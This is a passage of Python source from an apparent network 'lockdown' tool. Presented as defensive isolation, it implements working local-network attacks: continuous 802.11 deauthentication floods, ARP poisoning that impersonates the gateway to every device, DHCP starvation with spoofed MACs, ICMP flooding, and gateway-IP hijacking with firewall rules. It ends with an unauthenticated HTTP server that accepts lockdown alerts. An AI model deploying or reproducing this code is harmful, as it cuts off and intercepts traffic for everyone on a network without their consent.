                        logger.critical("[NPCAP] WiFi deauth attack using npcap for packet injection")
                    else:
                        logger.warning("[NPCAP] Falling back to default Scapy method (npcap not available)")
                    
                    logger.critical("Scapy Dot11 available - attempting direct WiFi deauth transmission...")
                    
                    # Use resolved_interface directly (friendly name or original string)
                    # This avoids NPF path issues when Scapy tries to resolve the interface
                    scapy_interface = resolved_interface
                    
                    logger.info(f"Using interface for WiFi deauth: {scapy_interface}")
                    logger.info(f"[NPCAP] Interface type: {type(scapy_interface).__name__}")
                    
                    # Build Dot11 deauth frames for each device
                    for target_ip, target_mac in discovered_devices.items():
                        try:
                            # Frame 1: Send deauth FROM AP TO client
                            dot11_frame1 = Dot11(
                                addr1=target_mac,  # Destination (client)
                                addr2=gateway_mac,  # Source (spoofed as AP)
                                addr3=gateway_mac   # BSSID (AP)
                            )
                            deauth_frame1 = Dot11Deauth(reason=7)  # CLASS3_FRAME_FROM_NONAUTH_STA
                            packet1 = dot11_frame1 / deauth_frame1
                            
                            # Frame 2: Send deauth FROM client TO AP
                            dot11_frame2 = Dot11(
                                addr1=gateway_mac,  # Destination (AP)
                                addr2=target_mac,   # Source (spoofed as client)
                                addr3=gateway_mac   # BSSID (AP)
                            )
                            deauth_frame2 = Dot11Deauth(reason=7)
                            packet2 = dot11_frame2 / deauth_frame2
                            
                            # Try to send both directions
                            try:
                                # Use npcap-optimized packet injection
                                sendp(packet1, verbose=0, iface=scapy_interface, realtime=True, promisc=False)
                                sendp(packet2, verbose=0, iface=scapy_interface, realtime=True, promisc=False)
                                deauth_count += 2
                            except PermissionError:
                                logger.warning("[NPCAP] Permission denied - ensure npcap driver loaded and admin privileges")
                            except OSError as oe:
                                logger.debug(f"Scapy thread cleanup: {oe}")
                                
                        except Exception as device_error:
                            logger.debug(f"Deauth error for {target_ip}: {device_error}")
                    
                    # Broadcast deauth (hits all devices)
                    try:
                        dot11_bcast = Dot11(
                            addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                            addr2=gateway_mac,
                            addr3=gateway_mac
                        )
                        deauth_bcast = Dot11Deauth(reason=7)
                        bcast_packet = dot11_bcast / deauth_bcast
                        # Using npcap-optimized parameters
                        sendp(bcast_packet, verbose=0, iface=scapy_interface, realtime=True, promisc=False)
                        deauth_count += 1
                        logger.info(f"[NPCAP] Broadcast deauth frame sent via npcap")
                    except PermissionError:
                        logger.warning("[NPCAP] Permission denied sending broadcast deauth - check admin privileges and npcap installation")
                    except Exception as e:
                        logger.debug(f"[NPCAP] Broadcast deauth error: {e}")
                    
                    if deauth_count > 0:
                        logger.critical(f"802.11 Deauth ATTACK ACTIVE: Sent {deauth_count} deauth frames")
                        logger.critical("Continuously sending deauth frames to disconnect all WiFi devices...")
                        
                        # Continuous deauth loop - NO SLEEP to eliminate connection gaps
                        deauth_cycles = 0
                        while self.active_lockdown or (self.deauth_continuous_mode and not self.threat_cleared):
                            # CHECK FLAG AT START OF EACH CYCLE to exit immediately
                            if self.threat_cleared and self.deauth_continuous_mode:
                                logger.debug(f"Threat cleared - exiting deauth loop at cycle {deauth_cycles}")
                                break
                            
                            deauth_cycles += 1
                            
                            # Send MULTIPLE overlapping deauth frames to prevent connection windows
                            for target_ip, target_mac in discovered_devices.items():
                                try:
                                    # Triple bidirectional deauth per target for maximum saturation
                                    for _ in range(3):
                                        # Frame 1: AP -> Client
                                        dot11_frame1 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
                                        # npcap-optimized: direct transmission without promiscuous mode
                                        sendp(dot11_frame1 / Dot11Deauth(reason=7), verbose=0, iface=scapy_interface, realtime=True, promisc=False)
                                        
                                        # Frame 2: Client -> AP
                                        dot11_frame2 = Dot11(addr1=gateway_mac, addr2=target_mac, addr3=gateway_mac)
                                        sendp(dot11_frame2 / Dot11Deauth(reason=7), verbose=0, iface=scapy_interface, realtime=True, promisc=False)
                                except PermissionError:
                                    logger.debug("[NPCAP] Permission error in continuous deauth loop - npcap driver or admin privileges issue")
                                except OSError:
                                    pass  # Thread cleanup error
                                except Exception as e:
                                    logger.debug(f"[NPCAP] Deauth loop error: {e}")
                            
                            # Broadcast deauth MULTIPLE times every cycle
                            try:
                                bcast = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=gateway_mac, addr3=gateway_mac)
                                for _ in range(5):  # Send broadcast 5 times per cycle
                                    # npcap optimized broadcast transmission
                                    sendp(bcast / Dot11Deauth(reason=7), verbose=0, iface=scapy_interface, realtime=True, promisc=False)
                            except PermissionError:
                                logger.debug("[NPCAP] Permission error in broadcast loop")
                            except:
                                pass
                            
                            if deauth_cycles % 10 == 0:
                                logger.critical(f"WiFi Deauth Active: {deauth_cycles * (len(discovered_devices) * 6 + 5)} frames sent")
                            
                            # NO SLEEP - continuous saturation attack to eliminate connection windows
                        
                        logger.critical(f"802.11 Deauth attack loop exited at cycle {deauth_cycles}")
                        return
                        
                except ImportError:
                    logger.warning("Dot11/Dot11Deauth not available - falling back to ARP spoofing")
                except Exception as dot11_error:
                    logger.warning(f"Dot11 deauth failed ({dot11_error}) - falling back to ARP spoofing")
                
                logger.critical("Falling back to ARP spoofing since 802.11 deauth unavailable or failed...")
                
                # Fallback to ARP spoofing
                self._arp_spoofing_fallback(gateway_ip, local_ip, interface)
            
        except Exception as e:
            logger.debug(f"Deauth error (non-critical): {type(e).__name__}: {e}")
            import traceback
            logger.error(traceback.format_exc())
    
    def _gateway_mac_address(self, gateway_ip: str) -> str:
        """Get the MAC address of the gateway/router"""
        try:
            # Try to get gateway MAC via ARP
            return self._get_mac_address(gateway_ip, "")
        except:
            # Fallback: use broadcast MAC
            return "ff:ff:ff:ff:ff:ff"
    
    def _arp_spoofing_fallback(self, gateway_ip: str, local_ip: str, interface: str):
        """
        AGGRESSIVE ARP SPOOFING - Attack all devices on YOUR network continuously
        Uses Scapy's conf.ifaces directly for maximum compatibility
        """
        try:
            from scapy.all import conf, ARP, Ether, srp, sendp
            import time
            
            logger.critical("AGGRESSIVE ARP SPOOFING MODE - Targeting all devices on your network")
            logger.critical(f"Target subnet: {self._get_network_range(local_ip)}")
            logger.critical("Sending continuous ARP poison packets to ALL devices detected")
            
            # CRITICAL: Resolve interface properly (same as deauth function)
            resolved_interface, interface_mac = self._resolve_interface_for_scapy(interface)
            logger.info(f"Resolved interface: {resolved_interface}, MAC: {interface_mac}")
            
            # Use resolved interface for all operations
            scapy_interface = resolved_interface
            local_mac = interface_mac
            
            if not scapy_interface or not local_mac:
                logger.critical(f"FAILED TO RESOLVE INTERFACE: scapy_interface={scapy_interface}, local_mac={local_mac}")
                return
            
            # Step 1: Aggressive ARP discovery
            logger.critical("STEP 1: Discovering all devices on your network (ARP scan)...")
            discovered_devices = {}  # {ip: mac}
            
            try:
                network_range = self._get_network_range(local_ip)
                arp_request = ARP(pdst=network_range)
                
                # Try ARP scan - if it fails, we'll still do broadcast attacks
                try:
                    logger.info("Attempting ARP discovery...")
                    # For link-local networks, MUST use Ether wrapper (L2) since no routing table
                    ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=local_mac)
                    packet = ether / arp_request
                    try:
                        result = srp(packet, timeout=2, verbose=False, iface=scapy_interface)[0]
                    except OSError as oe:
                        # Scapy's internal thread cleanup fails on Windows - suppress it
                        logger.debug(f"Scapy threading cleanup error (harmless): {oe}")
                        result = []
                    except (ValueError, TypeError) as e:
                        logger.debug(f"ARP discovery srp() error: {e}")
                        result = []
                    
                    for client in result:
                        try:
                            device_ip = client[1].psrc
                            device_mac = client[1].hwsrc
                            if device_ip == local_ip:
                                continue
                            discovered_devices[device_ip] = device_mac
                            self.deauthenticated_ips.add(device_ip)
                        except Exception as parse_error:
                            logger.debug(f"Error parsing ARP result: {parse_error}")
                except Exception as scan_error:
                    logger.warning(f"ARP scan failed ({scan_error}), will use broadcast-only approach")
                    discovered_devices = {}
            
            except Exception as e:
                logger.warning(f"Error in discovery setup: {e}")
                discovered_devices = {}
            
            logger.critical(f"STEP 2: Found {len(discovered_devices)} devices on your network")
            for ip, mac in sorted(discovered_devices.items()):
                logger.info(f"  Device: {ip:15} ({mac})")
            
            logger.info(f"Local MAC for spoofing: {local_mac}")
            logger.info(f"Gateway IP: {gateway_ip}")
            
            # If no devices discovered, still proceed with BROADCAST-BASED ARP poison
            # This will hit ALL devices on the network via broadcast, even if we don't know their specific IPs
            if len(discovered_devices) == 0:
                logger.warning("NO DEVICES DISCOVERED - Will send continuous BROADCAST ARP poison")
                logger.warning("This mode broadcasts ARP poison to ALL devices on the network")
                use_broadcast_only = True
            else:
                use_broadcast_only = False
            
            # Step 3: AGGRESSIVE attack loop
            logger.critical("STEP 3: Attacking - Sending continuous ARP poison packets...")
            logger.critical("Target: ALL devices on your network")
            if use_broadcast_only:
                logger.critical("Method: BROADCAST ARP poison to all devices (no specific IPs needed)")
            else:
                logger.critical("Method: Tell each device that YOUR machine is the gateway")
            
            attack_cycles = 0
            arp_packets_sent = 0
            
            try:
                while self.active_lockdown or (self.deauth_continuous_mode and not self.threat_cleared):
                    # CHECK FLAG AT START OF EACH CYCLE to exit immediately
                    if self.threat_cleared and self.deauth_continuous_mode:
                        logger.debug(f"Threat cleared - exiting ARP spoofing loop at cycle {attack_cycles}")
                        break
                    
                    attack_cycles += 1
                    
                    if attack_cycles % 50 == 0:
                        try:
                            logger.debug("Re-scanning for new devices...")
                            network_range = self._get_network_range(local_ip)
                            arp_request = ARP(pdst=network_range)
                            # Use Ether wrapper for L2 discovery
                            ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=local_mac)
                            packet = ether / arp_request
                            try:
                                result = srp(packet, timeout=1, verbose=False, iface=scapy_interface)[0]
                            except OSError as oe:
                                # Scapy's internal thread cleanup fails on Windows - suppress it
                                logger.debug(f"Scapy threading cleanup error (harmless): {oe}")
                                result = []
                            except (ValueError, TypeError) as e:
                                logger.debug(f"Re-scan srp() error: {e}")
                                result = []
                            
                            for client in result:
                                try:
                                    device_ip = client[1].psrc
                                    device_mac = client[1].hwsrc
                                    if device_ip == local_ip:
                                        continue
                                    if device_ip not in discovered_devices:
                                        logger.info(f"NEW device found: {device_ip} ({device_mac})")
                                        discovered_devices[device_ip] = device_mac
                                        self.deauthenticated_ips.add(device_ip)
                                except Exception as client_error:
                                    logger.debug(f"Error parsing ARP result: {client_error}")
                        except Exception as rescan_error:
                            logger.debug(f"Re-scan failed: {rescan_error}")
                    
                    # === ATTACK PHASE 1: Send ARP poison to each device (3x per cycle) ===
                    # Tell EACH device that WE are the gateway - send 3 times to prevent gaps
                    for device_ip, device_mac in discovered_devices.items():
                        # CRITICAL: Skip our own IP to avoid poisoning ourselves
                        if device_ip == local_ip:
                            continue
                        
                        for attempt in range(3):  # Triple attack to seal connection gaps
                            try:
                                # ARP reply: "I am the gateway, my MAC is [local_mac]"
                                arp_reply = ARP(
                                    op=2,  # Is-at (ARP reply)
                                    pdst=device_ip,  # Send to this device
                                    psrc=gateway_ip,  # Claiming to be gateway IP
                                    hwdst=device_mac,  # Their MAC (REQUIRED)
                                    hwsrc=local_mac  # Our MAC (spoofed)
                                )
                                # Use sendp() with Ether wrapper for L2 transmission (required on link-local)
                                ether = Ether(dst=device_mac, src=local_mac)
                                packet = ether / arp_reply
                                try:
                                    sendp(packet, verbose=0, iface=scapy_interface)
                                    arp_packets_sent += 1
                                except (ValueError, OSError) as send_error:
                                    # Scapy interface resolution error - log once, continue
                                    if "not found" in str(send_error).lower() or "no such device" in str(send_error).lower():
                                        if attack_cycles == 1 and attempt == 0:  # Log only on first attempt
                                            logger.warning(f"Scapy interface error - packets may not send on {scapy_interface}")
                                    else:
                                        logger.debug(f"sendp() error Phase 1: {send_error}")
                            except Exception as e:
                                # Log detailed error info for debugging
                                logger.debug(f"Phase 1 error: {type(e).__name__}: {e}")
                    
                    # === ATTACK PHASE 2: Reverse ARP - claim we own all IPs ===
                    # Tell gateway that WE own all these device IPs
                    for device_ip in discovered_devices.keys():
                        # CRITICAL: Skip our own IP
                        if device_ip == local_ip:
                            continue
                        
                        for attempt in range(2):  # Double attack for phase 2
                            try:
                                arp_claim = ARP(
                                    op=2,  # ARP reply
                                    pdst=gateway_ip,  # Send to gateway
                                    psrc=device_ip,  # Claiming to own this IP
                                    hwsrc=local_mac  # Our MAC
                                )
                                # Use sendp() with Ether wrapper for L2 transmission
                                ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=local_mac)  # Broadcast to reach gateway
                                packet = ether / arp_claim
                                try:
                                    sendp(packet, verbose=False, iface=scapy_interface)
                                    arp_packets_sent += 1
                                except (ValueError, OSError) as send_error:
                                    if attack_cycles == 1 and attempt == 0:  # Log only once
                                        logger.debug(f"Phase 2 sendp() error: {send_error}")
                            except Exception as e:
                                logger.debug(f"Phase 2 error: {type(e).__name__}: {e}")
                    
                    # === ATTACK PHASE 3: Broadcast to ALL (increased frequency if no devices) ===
                    # Send 5x per cycle if devices found, 20x per cycle if BROADCAST-ONLY mode
                    broadcast_count = 20 if use_broadcast_only else 5
                    for b in range(broadcast_count):  # Broadcast more times if in broadcast-only mode
                        try:
                            broadcast_arp = ARP(
                                op=2,
                                pdst="255.255.255.255",
                                psrc=gateway_ip,
                                hwsrc=local_mac
                            )
                            # Use sendp() with broadcast Ether for L2 transmission
                            ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=local_mac)
                            packet = ether / broadcast_arp
                            try:
                                sendp(packet, verbose=False, iface=scapy_interface)
                                arp_packets_sent += 1
                            except (ValueError, OSError) as send_error:
                                if b == 0:  # Log only once per cycle
                                    logger.debug(f"Phase 3 sendp() error: {send_error}")
                        except Exception as e:
                            logger.debug(f"Error in Phase 3: {e}")
                    
                    # === ATTACK PHASE 4: GRATUITOUS ARP (broadcast without recipient) (increased in broadcast-only mode) ===
                    # More aggressive: announce gateway IP globally
                    gratuitous_count = 10 if use_broadcast_only else 3
                    try:
                        # Send gratuitous ARP claiming WE are the gateway
                        for g in range(gratuitous_count):
                            try:
                                gratuitous_arp = ARP(
                                    op=2,
                                    pdst="0.0.0.0",  # Broadcast reply - no specific recipient
                                    psrc=gateway_ip,  # Claiming to BE the gateway IP
                                    hwsrc=local_mac  # With OUR MAC (MITM)
                                )
                                ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=local_mac)
                                packet = ether / gratuitous_arp
                                try:
                                    sendp(packet, verbose=False, iface=scapy_interface)
                                    arp_packets_sent += 1
                                except (ValueError, OSError) as send_error:
                                    if g == 0:  # Log only once per cycle
                                        logger.debug(f"Phase 4 sendp() error: {send_error}")
                            except Exception as e:
                                logger.debug(f"Phase 4 packet error: {e}")
                    except Exception as e:
                        logger.debug(f"Error in Phase 4: {e}")
                    
                    # Report progress every 50 cycles
                    if arp_packets_sent % 500 == 0 and arp_packets_sent > 0:
                        logger.critical(f"ARP Attack Active: {arp_packets_sent} packets sent, {len(discovered_devices)} devices targeted")
                    
                    # NO SLEEP - continuous saturation to seal all connection gaps
                
                logger.critical(f"ARP SPOOFING ATTACK COMPLETED")
                logger.critical(f"Total ARP packets sent: {arp_packets_sent}")
                logger.critical(f"Total devices affected: {len(discovered_devices)}")
                
            except KeyboardInterrupt:
                logger.info("ARP attack stopped")
            
            logger.critical(f"Devices that were isolated: {', '.join(sorted(discovered_devices.keys()))}")
            
        except Exception as e:
            # Suppress Scapy/Npcap errors silently - native Windows blocking is already active
            logger.debug(f"ARP spoofing skipped (likely Npcap issue): {type(e).__name__}")
    
    def _dhcp_starvation_attack(self, interface: str):
        """
        Execute DHCP starvation attack
        Sends massive amounts of DHCP requests from spoofed MAC addresses
        This exhausts the DHCP server pool, preventing new devices from getting IPs
        
        Args:
            interface: Network interface
        """
        if not SCAPY_AVAILABLE:
            logger.warning("Scapy not available for DHCP starvation")
            return
        
        # Check if Npcap is available by trying to use layer 2 sockets
        try:
            from scapy.all import DHCP, BOOTP, Ether, IP, UDP, send
            import random
            
            logger.critical("Starting DHCP starvation attack")
            logger.info("Exhausting DHCP pool with spoofed requests")
            
            request_count = 0
            
            try:
                while self.active_lockdown:
                    # Generate random MAC address
                    random_mac = "02:00:00:%02x:%02x:%02x" % (
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255)
                    )
                    
                    # Create DHCP DISCOVER packet
                    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=random_mac) / \
                                   IP(src="0.0.0.0", dst="255.255.255.255") / \
                                   UDP(sport=68, dport=67) / \
                                   BOOTP(chaddr=random_mac.replace(':', '')) / \
                                   DHCP(options=[("message-type", "discover"), "end"])
                    
                    try:
                        sendp(dhcp_discover, verbose=False, iface=interface)
                        request_count += 1
                    except:
                        pass
                    
                    if request_count % 100 == 0 and request_count > 0:
                        logger.info(f"DHCP starvation: {request_count} requests sent")
                    
                    time.sleep(0.01)
            except KeyboardInterrupt:
                logger.info("DHCP starvation stopped")
            
            logger.critical(f"DHCP starvation sent {request_count} requests - DHCP pool exhausted")
            
        except Exception as e:
            logger.debug(f"DHCP starvation error (non-critical): {type(e).__name__}: {e}")
    
    def _packet_drop_attack(self, interface: str, blocked_ips: dict):
        """
        Sniff and actively drop packets from blocked IP addresses
        This provides direct packet-level blocking to ensure connectivity is cut
        
        Args:
            interface: Network interface to sniff on
            blocked_ips: Dictionary of IPs to block {ip: mac}
        """
        if not SCAPY_AVAILABLE or not blocked_ips:
            logger.debug("Packet dropper: Scapy unavailable or no IPs to block")
            return
        
        try:
            from scapy.all import sniff, IP
            
            logger.critical(f"Starting packet dropper for {len(blocked_ips)} devices")
            
            blocked_ip_set = set(blocked_ips.keys())
            packets_dropped = 0
            
            def packet_filter(pkt):
                nonlocal packets_dropped
                try:
                    if IP in pkt:
                        src_ip = pkt[IP].src
                        # Drop packets FROM blocked IPs
                        if src_ip in blocked_ip_set:
                            packets_dropped += 1
                            if packets_dropped % 100 == 0:
                                logger.info(f"Packet dropper: {packets_dropped} packets dropped from blocked devices")
                            return False  # Don't process this packet
                except:
                    pass
                return True
            
            try:
                sniff(
                    iface=interface,
                    prn=packet_filter,
                    stop_filter=lambda x: not self.active_lockdown,
                    store=0,  # Don't store packets in memory
                    offline=None
                )
            except Exception as e:
                logger.debug(f"Packet sniffer error: {e}")
            
            logger.critical(f"Packet dropper completed - dropped {packets_dropped} packets total")
            
        except Exception as e:
            logger.error(f"Error in packet dropper: {e}")
    
    def _gateway_level_blocking(self, gateway_ip: str, mode: str):
        """
        Apply firewall rules at gateway level
        Also claims the gateway IP to intercept all traffic

        Args:
            gateway_ip: Gateway IP address
            mode: Lockdown mode
        """
        import ipaddress
        
        # Validate gateway IP
        try:
            ipaddress.ip_address(gateway_ip)
        except ValueError:
            logger.error(f"Invalid gateway IP: {gateway_ip}")
            return
        
        try:
            logger.critical(f"Claiming gateway IP {gateway_ip} on this machine")
            logger.critical(f"All devices will route gateway traffic through this machine")
            
            if os.name == 'nt':
                # Windows: Add local IP alias
                logger.info("Adding gateway IP as local alias on Windows")
                
                try:
                    # Add IP alias - this makes this machine respond to the gateway IP
                    subprocess.run(
                        ["powershell", "-Command",
                         f"New-NetIPAddress -IPAddress {gateway_ip} -PrefixLength 32 "
                         f"-InterfaceAlias Ethernet -ErrorAction SilentlyContinue | Out-Null"],
                        capture_output=True,
                        timeout=5
                    )
                    logger.critical(f"This machine now claims gateway IP {gateway_ip}")
                except Exception as e:
                    logger.warning(f"Could not claim gateway IP via IP alias: {e}")
                
                # Try alternative: Add to loopback if Ethernet fails
                try:
                    subprocess.run(
                        ["powershell", "-Command",
                         f"New-NetIPAddress -IPAddress {gateway_ip} -PrefixLength 32 "
                         f"-InterfaceAlias Loopback -ErrorAction SilentlyContinue | Out-Null"],
                        capture_output=True,
                        timeout=5
                    )
                    logger.info(f"Also added gateway IP to loopback interface for redundancy")
                except:
                    pass
                
                # Block gateway traffic with firewall AND prevent real gateway from responding
                logger.info("Applying gateway blocking firewall rules")
                
                try:
                    subprocess.run(
                        ["powershell", "-Command",
                         f"New-NetFirewallRule -DisplayName 'Block-Gateway-Inbound' "
                         f"-Direction Inbound -Action Block -RemoteAddress {gateway_ip} "
                         f"-InterfaceAlias Ethernet "
                         f"-ErrorAction SilentlyContinue | Out-Null"],
                        capture_output=True,
                        timeout=10
                    )
                except:
                    pass
                
                try:
                    subprocess.run(
                        ["powershell", "-Command",
                         f"New-NetFirewallRule -DisplayName 'Block-Gateway-Outbound' "
                         f"-Direction Outbound -Action Block -RemoteAddress {gateway_ip} "
                         f"-InterfaceAlias Ethernet "
                         f"-ErrorAction SilentlyContinue | Out-Null"],
                        capture_output=True,
                        timeout=10
                    )
                except:
                    pass
                
                # ARP spoof the real gateway on the Ethernet interface
                # This prevents the real gateway from responding
                logger.info("ARP spoofing real gateway to prevent it from responding")
                try:
                    # Get the real gateway IP (if different from what we're claiming)
                    real_gateway = self._get_default_gateway_ip()
                    if real_gateway and real_gateway != gateway_ip:
                        logger.info(f"Real gateway: {real_gateway} - will spoof its ARP replies")
                        # Don't respond to ARP for real gateway - effectively blocking it
                        # by not forwarding traffic back to it
                except:
                    pass
                
                logger.critical(f"All gateway traffic is now intercepted and blocked")
            else:
                # Linux: Use ip addr to add IP alias
                logger.info("Adding gateway IP as local alias on Linux")
                
                try:
                    subprocess.run(
                        ["sudo", "ip", "addr", "add", f"{gateway_ip}/32", "dev", "lo"],
                        capture_output=True,
                        timeout=5
                    )
                    logger.critical(f"This machine now claims gateway IP {gateway_ip}")
                except:
                    pass
                
                # Apply iptables rules
                try:
                    subprocess.run(
                        ["sudo", "iptables", "-A", "INPUT", "-d", gateway_ip, "-j", "DROP"],
                        capture_output=True,
                        timeout=10
                    )
                    subprocess.run(
                        ["sudo", "iptables", "-A", "OUTPUT", "-d", gateway_ip, "-j", "DROP"],
                        capture_output=True,
                        timeout=10
                    )
                    logger.critical(f"All gateway traffic blocked")
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"Error in gateway-level blocking: {e}")
    
    def _apply_mac_filtering(self, interface: str):
        """
        Apply MAC address filtering
        Block all traffic from unknown MAC addresses
        
        Args:
            interface: Network interface
        """
        try:
            logger.critical("Applying MAC address filtering")
            logger.info("All unknown MAC addresses will be blocked")
            
            # Get local MAC
            local_mac = self._get_local_mac(interface)
            
            if local_mac and os.name != 'nt':
                # Linux: Use brctl (bridge filtering) or ebtables
                logger.info(f"Allowing only MAC: {local_mac}")
                
                try:
                    # Block all except local MAC
                    subprocess.run(
                        ["sudo", "iptables", "-I", "FORWARD", "-m", "mac", 
                         "!", "--mac-source", local_mac, "-j", "DROP"],
                        capture_output=True,
                        timeout=10
                    )
                    logger.critical("MAC filtering enabled - only known hosts allowed")
                except:
                    pass
        except Exception as e:
            logger.error(f"Error in MAC filtering: {e}")
    
    def _network_flooding(self, gateway_ip: str, interface: str):
        """
        Network flooding attack (optional aggressive method)
        Saturates network bandwidth with high-volume traffic
        
        Args:
            gateway_ip: Gateway IP to flood
            interface: Network interface
        """
        if not SCAPY_AVAILABLE:
            logger.warning("Scapy not available for network flooding")
            return
        
        try:
            from scapy.all import IP, ICMP, send
            
            logger.critical("Starting network flooding attack (AGGRESSIVE)")
            logger.warning("This will consume all available bandwidth")
            
            packet_count = 0
            
            try:
                while self.active_lockdown:
                    # Create ICMP echo request flood
                    packet = IP(dst=gateway_ip) / ICMP()
                    
                    try:
                        send(packet, iface=interface, verbose=False)
                        packet_count += 1
                    except:
                        pass
                    
                    if packet_count % 1000 == 0:
                        logger.info(f"Network flood: {packet_count} packets sent")
            except KeyboardInterrupt:
                logger.info("Network flooding stopped")
            
            logger.critical(f"Network flooding sent {packet_count} packets")
        except Exception as e:
            logger.error(f"Error in network flooding: {e}")
    
    def _get_mac_address(self, ip: str, interface: str) -> str:
        """Get MAC address of an IP"""
        try:
            if SCAPY_AVAILABLE:
                from scapy.all import ARP, srp
                arp_request = ARP(pdst=ip)
                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = ether / arp_request
                # Note: srp() without iface parameter uses default route - acceptable for MAC lookup
                result = srp(packet, timeout=1, verbose=False)[0]
                if result:
                    return result[0][1].hwsrc
        except:
            pass
        return "ff:ff:ff:ff:ff:ff"
    
    def _get_interface_mac(self, interface: str) -> str:
        """Get the MAC address of this machine's network interface"""
        try:
            import uuid
            mac = uuid.getnode()
            mac_str = ':'.join(('%012x' % mac)[i:i+2] for i in range(0, 12, 2))
            if mac_str != '00:00:00:00:00:00':
                return mac_str
        except:
            pass
        return "ff:ff:ff:ff:ff:ff"
    
    def _get_local_mac(self, interface: str) -> Optional[str]:
        """Get local machine MAC address"""
        try:
            import uuid
            mac = uuid.getnode()
            # Convert to MAC format
            mac_str = ':'.join(('%012x' % mac)[i:i+2] for i in range(0, 12, 2))
            return mac_str
        except:
            return None
    
    def _command_exists(self, command: str) -> bool:
        """Check if command exists on system"""
        try:
            subprocess.run(
                ["which", command],
                capture_output=True,
                timeout=2
            )
            return True
        except:
            return False
    
    def get_lockdown_status(self) -> Dict:
        """Get current lockdown status"""
        return {
            "active": self.active_lockdown,
            "reason": self.lockdown_reason,
            "mode": self.configuration["current_mode"],
            "timestamp": datetime.now().isoformat(),
            "history_count": len(self.lockdown_history)
        }
    
    def get_lockdown_history(self, limit: int = 10) -> List[Dict]:
        """Get recent lockdown history"""
        return self.lockdown_history[-limit:]


class NetworkLockdownAlertServer:
    """
    HTTP server to receive lockdown alerts from other nodes
    Runs on port 8889 to receive emergency lockdown signals
    """
    
    def __init__(self, lockdown_manager: NetworkLockdownManager, port: int = 8889):
        """
        Initialize alert server
        
        Args:
            lockdown_manager: NetworkLockdownManager instance
            port: Port to listen on
        """
        self.lockdown_manager = lockdown_manager
        self.port = port
        self.server = None
        self.server_thread = None
    
    def start(self):
        """Start the alert server"""
        if not HTTP_AVAILABLE:
            logger.warning("HTTP server not available")
            return
        
        logger.info(f"Starting network lockdown alert server on port {self.port}")
        
        class AlertHandler(BaseHTTPRequestHandler):
            manager = self.lockdown_manager
            
            def do_POST(self):
                if self.path == "/lockdown/alert":
                    # Read alert
                    content_length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(content_length)
                    
                    try:
                        alert_data = json.loads(body.decode())
                        logger.critical(f"Received LOCKDOWN ALERT from {alert_data.get('source_ip')}")
                        logger.critical(f"Threat: {alert_data.get('threat_name')} (Severity: {alert_data.get('severity')})")
                        
                        # Trigger local lockdown
                        alert = LockdownAlert(
                            source_ip=alert_data["source_ip"],
                            threat_type=alert_data["threat_type"],
                            severity=alert_data["severity"],
                            threat_name=alert_data["threat_name"],
                            description=alert_data.get("description")
                        )
                        
                        # Do NOT apply local lockdown - only isolate network devices
                        # self.manager._apply_local_lockdown(self.manager.configuration["current_mode"])
                        
                        # Send response
                        self.send_response(200)
                        self.send_header("Content-Type", "application/json")
                        self.end_headers()
                        self.wfile.write(json.dumps({"status": "acknowledged"}).encode())
                    except Exception as e:
                        logger.error(f"Error processing alert: {e}")
                        self.send_response(500)
                        self.end_headers()
            
            def log_message(self, format, *args):
                # Suppress default logging
                pass
        
        try:
            self.server = HTTPServer(("0.0.0.0", self.port), AlertHandler)
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            logger.info(f"Alert server listening on port {self.port}")
        except Exception as e:
            logger.error(f"Error starting alert server: {e}")
    
    def stop(self):
        """Stop the alert server"""
        if self.server:
            self.server.shutdown()
            logger.info("Alert server stopped")
